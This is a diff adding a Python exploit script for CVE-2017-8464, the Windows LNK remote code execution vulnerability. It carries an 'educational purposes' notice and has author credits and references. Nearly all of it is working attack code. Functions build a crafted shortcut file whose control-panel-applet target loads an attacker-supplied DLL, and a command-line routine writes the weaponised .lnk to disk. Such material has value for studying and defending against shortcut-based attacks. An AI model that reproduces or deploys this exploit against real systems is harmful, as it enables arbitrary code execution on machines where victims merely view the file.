@@ -1,0 +1,245 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+# Title             : CVE-2017-8464 | LNK Remote Code Execution Vulnerability
+# CVE               : 2017-8464
+# Authors           : [ykoster, nixawk]
+# Notice            : Only for educational purposes.
+# Support           : python2
+
+import struct
+
+
+def generate_SHELL_LINK_HEADER():
+    # _________________________________________________________________
+    # | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
+    # |0|1|2|3|4|5|6|7|8|9|0|1|2|3|4|5|6|7|8|9|0|1|2|3|4|5|6|7|8|9|0|1|
+    # -----------------------------------------------------------------
+    # |  HeaderSize                                                   |
+    # -----------------------------------------------------------------
+    # |  LinkCLSID (16 bytes)                                         |
+    # -----------------------------------------------------------------
+    # |  ...                                                          |
+    # -----------------------------------------------------------------
+    # |  ...                                                          |
+    # -----------------------------------------------------------------
+    # |  LinkFlags                                                    |
+    # -----------------------------------------------------------------
+    # |  FileAttributes                                               |
+    # -----------------------------------------------------------------
+    # |  CreationTime                                                 |
+    # -----------------------------------------------------------------
+    # |  ...                                                          |
+    # -----------------------------------------------------------------
+    # |  AccessTime                                                   |
+    # -----------------------------------------------------------------
+    # |  ...                                                          |
+    # -----------------------------------------------------------------
+    # |  WriteTime                                                    |
+    # -----------------------------------------------------------------
+    # |  ...                                                          |
+    # -----------------------------------------------------------------
+    # |  FileSize                                                     |
+    # -----------------------------------------------------------------
+    # |  IconIndex                                                    |
+    # -----------------------------------------------------------------
+    # |  ShowCommand                                                  |
+    # -----------------------------------------------------------------
+    # |  HotKey                       |   Reserved1                   |
+    # -----------------------------------------------------------------
+    # |  Reserved2                                                    |
+    # -----------------------------------------------------------------
+    # |  Reserved3                                                    |
+    # -----------------------------------------------------------------
+
+    shell_link_header = [
+        b'\x4c\x00\x00\x00',                                                 # "HeaderSize"     : (4 bytes)
+        b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46', # "LinkCLSID"      : (16 bytes) HKEY_CLASSES_ROOT\CLSID\{00021401-0000-0000-C000-000000000046}
+        b'\x81\x00\x00\x00',                                                 # "LinkFlags"      : (4 bytes)  0x81 = 0b10000001 = HasLinkTargetIDList + IsUnicode
+        b'\x00\x00\x00\x00',                                                 # "FileAttributes" : (4 bytes)
+        b'\x00\x00\x00\x00\x00\x00\x00\x00',                                 # "CreationTime"   : (8 bytes)
+        b'\x00\x00\x00\x00\x00\x00\x00\x00',                                 # "AccessTime"     : (8 bytes)
+        b'\x00\x00\x00\x00\x00\x00\x00\x00',                                 # "WriteTime"      : (8 bytes)
+        b'\x00\x00\x00\x00',                                                 # "FileSize"       : (4 bytes)
+        b'\x00\x00\x00\x00',                                                 # "IconIndex"      : (4 bytes)
+        b'\x00\x00\x00\x00',                                                 # "ShowCommand"    : (4 bytes)
+        b'\x00\x00',                                                         # "HotKey"         : (2 bytes)
+        b'\x00\x00',                                                         # "Reserved1"      : (2 bytes)
+        b'\x00\x00\x00\x00',                                                 # "Reserved2"      : (4 bytes)
+        b'\x00\x00\x00\x00',                                                 # "Reserved3"      : (4 bytes)
+    ]
+
+    return b"".join(shell_link_header)
+
+
+def generate_LINKTARGET_IDLIST(path, name):
+    # _________________________________________________________________
+    # | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
+    # |0|1|2|3|4|5|6|7|8|9|0|1|2|3|4|5|6|7|8|9|0|1|2|3|4|5|6|7|8|9|0|1|
+    # -----------------------------------------------------------------
+    # | IDListSize                     |   IDList(variable)           |
+    # -----------------------------------------------------------------
+    # |  ...                                                          |
+    # -----------------------------------------------------------------
+
+    # IDList = ItemID + ItemID + ... + TerminalID
+    #          ItemID = ItemIDSize + Data
+
+    def generate_ItemID(Data):
+        itemid = [
+            struct.pack('H', len(Data) + 2),  # ItemIDSize + len(Data)
+            Data
+        ]
+        # ItemIDSize = struct.pack('H', len(Data) + 2)  # ItemIDSize + len(Data)
+
+        # return ItemIDSize + Data
+
+        return b"".join(itemid)
+
+    def generate_cpl_applet(path, name=name):
+        name += b'\x00'
+        path += b'\x00'
+
+        bindata = [
+            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6a\x00\x00\x00\x00\x00\x00',
+            struct.pack('H', len(path)),
+            struct.pack('H', len(name)),
+            path.encode('utf-16')[2:],
+            name.encode('utf-16')[2:],
+            b"\x00\x00"  # comment
+        ]
+
+        return b"".join(bindata)
+
+    idlist = [
+        # ItemIDList
+
+        generate_ItemID(b'\x1f\x50\xe0\x4f\xd0\x20\xea\x3a\x69\x10\xa2\xd8\x08\x00\x2b\x30\x30\x9d'),
+        generate_ItemID(b'\x2e\x80\x20\x20\xec\x21\xea\x3a\x69\x10\xa2\xdd\x08\x00\x2b\x30\x30\x9d'),
+        generate_ItemID(generate_cpl_applet(path)),
+
+        b'\x00\x00',  # TerminalID
+    ]
+
+    idlist = b"".join(idlist)
+    idlistsize = struct.pack('H', len(idlist))
+
+    linktarget_idlist = [
+        idlistsize,
+        idlist,
+    ]
+
+    return b"".join(linktarget_idlist)
+
+
+def generate_EXTRA_DATA():
+    # ExtraData refers to a set of structures that convey additional information about a link target. These
+    # optional structures can be present in an extra data section that is appended to the basic Shell Link
+    # Binary File Format.
+
+    # EXTRA_DATA = *EXTRA_DATA_BLOCK TERMINAL_BLOCK
+
+    # EXTRA_DATA_BLOCK = CONSOLE_PROPS / CONSOLE_FE_PROPS / DARWIN_PROPS /
+    #  ENVIRONMENT_PROPS / ICON_ENVIRONMENT_PROPS /
+    # KNOWN_FOLDER_PROPS / PROPERTY_STORE_PROPS /
+    # SHIM_PROPS / SPECIAL_FOLDER_PROPS /
+    # TRACKER_PROPS / VISTA_AND_ABOVE_IDLIST_PROPS
+
+    # SpecialFolderDataBlock
+
+    # _________________________________________________________________
+    # | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
+    # |0|1|2|3|4|5|6|7|8|9|0|1|2|3|4|5|6|7|8|9|0|1|2|3|4|5|6|7|8|9|0|1|
+    # -----------------------------------------------------------------
+    # | BlockSize                                                     |
+    # -----------------------------------------------------------------
+    # | BlockSignatire                                                |
+    # -----------------------------------------------------------------
+    # | SpecialFolderID                                               |
+    # -----------------------------------------------------------------
+    # | Offset                                                        |
+    # -----------------------------------------------------------------
+
+    extra_data = [
+        b'\x10\x00\x00\x00',
+        b'\x05\x00\x00\xA0',
+        b'\x03\x00\x00\x00',
+        b'\x28\x00\x00\x00',
+        b'\x00\x00\x00\x00'   # TERMINAL_BLOCK
+    ]
+
+    return b"".join(extra_data)
+
+
+def ms_shllink(path, name=b"Microsoft"):
+    '''build Shell Link (.LNK) Binary File Format'''
+
+    lnk_format = [
+
+        # Structures
+
+        # SHELL_LINK = SHELL_LINK_HEADER [LINKTARGET_IDLIST] [LINKINFO]
+        #              [STRING_DATA] *EXTRA_DATA
+
+
+        # SHELL_LINK_HEADER:
+        #     A ShelllinkHeader structure which contains identification information, timestamps, and
+        #     flags that specify the presence of optional structures.
+
+        generate_SHELL_LINK_HEADER(),
+
+        # LINKTARGET_IDLIST:
+        #     An optional LinkTargetIDList structure,  which specifies the target of the link. The
+        #     presence of this structure is specified by the HasLinkTargetIDList bit in the ShellLinkHeader.
+        #
+        #
+
+        generate_LINKTARGET_IDLIST(path, name),
+
+        # LINKINFO:
+        #     An optional LinkInfo structure, which specifies information necessary to resolve the link target.
+        #     The presence of this structure is specified by the HasLinkInfo bit in the ShellLinkHeader.
+
+        # STRING_DATA:
+        #     Zero or more optional StringData structures, which are used to convey user interface and path
+        #     identification information. The presence of these structures is specified by bits in the ShellLinkHeader.
+
+        # STRING_DATA = [NAME_STRING] [RELATIVE_PATH] [WORKING_DIR]
+        #     [COMMAND_LINE_ARGUMENTS] [ICON_LOCATION]
+
+        # EXTRA_DATA:
+        #     Zero or more ExtraData structures
+
+        generate_EXTRA_DATA()
+    ]
+
+    return b"".join(lnk_format)
+
+
+if __name__ == '__main__':
+    import sys
+
+    if len(sys.argv) != 3:
+        print("[*] Name : CVE-2017-8464 | LNK Remote Code Execution Vulnerability")
+        print("[*] Usage: %s </path/to/test.lnk> </path/to/test.dll>" % sys.argv[0])
+        sys.exit(0)
+
+    lnkpath = sys.argv[1]
+    dllpath = sys.argv[2]
+
+    bindata = ms_shllink(path=dllpath)
+
+    with open(lnkpath, 'wb') as lnkf:
+        lnkf.write(bindata)
+
+
+## References
+
+# 1. https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464
+# 2. https://msdn.microsoft.com/en-us/library/dd871305.aspx
+# 3. https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SHLLINK/[MS-SHLLINK]-160714.pdf
+# 4. https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf
+# 5. https://support.microsoft.com/en-us/help/149648/description-of-control-panel--cpl-files
+# 6. https://twitter.com/mkolsek/status/877499744704237568
+# 7. https://community.saas.hpe.com/t5/Security-Research/Full-details-on-CVE-2015-0096-and-the-failed-MS10-046-Stuxnet/ba-p/251257#.WXi4uNPys6g
+# 8. https://github.com/rapid7/metasploit-framework/pull/8767
